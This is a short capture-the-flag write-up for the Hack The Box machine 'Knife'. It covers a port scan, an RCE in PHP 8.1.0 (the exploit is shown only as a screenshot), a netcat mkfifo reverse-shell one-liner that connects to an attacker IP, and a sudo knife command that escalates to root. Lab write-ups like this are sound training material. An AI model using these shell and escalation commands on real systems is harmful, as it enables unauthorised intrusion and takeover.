## Knife

Difficulty: Easy

### User Flag

```
rustscan -a knife.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/219143929-dc158e0e-f3d9-416d-aaff-feb205ad31f9.png)

<br>

Looking through the technologies used we find PHP 8.1.0.

![phpVersion](https://user-images.githubusercontent.com/58514930/219144089-e67741e4-2be2-4e4e-8420-852a550ea758.png)

<br>

This version has a RCE exploit.

![userAccess](https://user-images.githubusercontent.com/58514930/219144579-c7991038-79c1-4b5f-874f-3de926982e12.png)

### Getting a Better Shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 3333 >/tmp/f
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![improveShell](https://user-images.githubusercontent.com/58514930/219145038-8f6a200c-2905-49c2-a1f7-4feddd0f2b29.png)

### Root Flag

Enumerating with sudo -l we see that our user can execute "knife" as sudo.

```
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

![rootShell](https://user-images.githubusercontent.com/58514930/219145096-f55459e3-4b93-4624-a8a5-9cc62ac5a9ea.png)
